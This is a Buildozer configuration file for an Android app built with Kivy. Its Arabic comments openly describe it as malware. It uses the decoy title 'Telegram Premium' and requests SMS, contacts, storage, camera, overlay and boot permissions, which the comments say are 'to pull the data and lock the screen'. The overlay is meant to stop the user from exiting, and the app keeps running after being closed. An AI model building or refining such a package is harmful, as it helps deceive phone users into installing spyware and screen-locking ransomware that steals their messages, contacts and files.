[app]
# الاسم التمويهي (الفخ)
title = Telegram Premium
# تغيير الـ package.name ضروري عشان الموبايل يعتبره تطبيق جديد ويحدث الاسم
package.name = d3f4ult_pro_v2
package.domain = org.godfather
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 2.0

# ضفت لك كلمة 'android' هنا عشان الكود الجديد يشتغل
requirements = python3, kivy==2.1.0, pyjnius, requests, urllib3, android

orientation = portrait

# --- Android specific ---
fullscreen = 1

# الصلاحيات كاملة لسحب الداتا وقفل الشاشة
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, READ_SMS, RECEIVE_SMS, SEND_SMS, READ_CONTACTS, SYSTEM_ALERT_WINDOW, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, WAKE_LOCK

android.api = 31
android.minapi = 21
android.ndk = 25b
android.sdk = 31

# تشغيل ميزة الظهور فوق التطبيقات (Overlay) - دي اللي هتمنع الخروج
android.system_alert_window = True

# ميزة العمل في الخلفية حتى لو التطبيق اتقفل
android.wakelock = True

# دعم جميع معماربات المعالجات
android.archs = arm64-v8a, armeabi-v7a

android.accept_sdk_license = True
android.private_storage = True
android.release_artifact = apk
android.debug_artifact = apk

[buildozer]
log_level = 2
warn_on_root = 1
